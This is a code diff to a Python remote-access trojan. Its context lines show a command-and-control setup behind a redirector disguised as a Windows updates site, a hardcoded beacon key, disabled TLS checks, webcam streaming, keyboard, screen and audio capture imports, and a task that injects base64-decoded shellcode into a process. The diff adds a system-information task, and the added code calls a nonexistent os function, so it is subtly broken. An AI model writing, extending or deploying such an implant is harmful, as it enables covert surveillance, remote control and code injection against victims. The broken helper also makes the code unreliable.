@@ -26,10 +26,9 @@ import mss
 import cv2
 import pyaudio
 import wave
-import keyboard  # pip install keyboard (requires admin for global hook)
+import keyboard
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
 
 # ===================== CONFIG =====================
 REDIRECTOR_URL = "https://windows-updates.vercel.app/"
@@ -37,7 +36,6 @@ c2_url = ""                     # Dynamic — resolved at runtime
 c2_fetch_backoff = 60.0         # seconds, float for easy *=
 pending_results = []
 results_lock = threading.Lock()
-
 
 BEACON_KEY = b"0123456789abcdef0123456789abcdef"  # 32-byte key, match server
 SLEEP_BASE = 5   # seconds
@@ -184,7 +182,6 @@ hostname = os.getenv("COMPUTERNAME")
 username = os.getenv("USERNAME")
 session = requests.Session()
 session.verify = False  # match Go InsecureSkipVerify
-
 
 
 def fetch_beacon_url() -> str:
@@ -346,6 +343,16 @@ def stop_webcam_stream():
         return "Webcam stream stopped"
 
 
+def get_sysinfo():
+    import platform
+    info = {
+        "machine": platform.machine(),
+        "version": platform.version(),
+        "platform": platform.platform(),
+        "processor": platform.processor(),
+        "cpu_count": os.cpu_local_count() if hasattr(os, 'cpu_count') else "N/A",
+    }
+    return json.dumps(info)
 
 def handle_task(task):
     tid = task["task_id"]
@@ -406,6 +413,9 @@ def handle_task(task):
             sc = base64.b64decode(parts[1])
             result["output"] = inject_shellcode(pid, sc)
         # Add more as needed (sysinfo, etc.)
+        elif ttype == "sysinfo":
+            result["output"] = get_sysinfo()
+
     except Exception as e:
         result["error"] = str(e)
 
@@ -414,6 +424,4 @@ def handle_task(task):
 
 if __name__ == "__main__":
     import sys
-
     main()
-
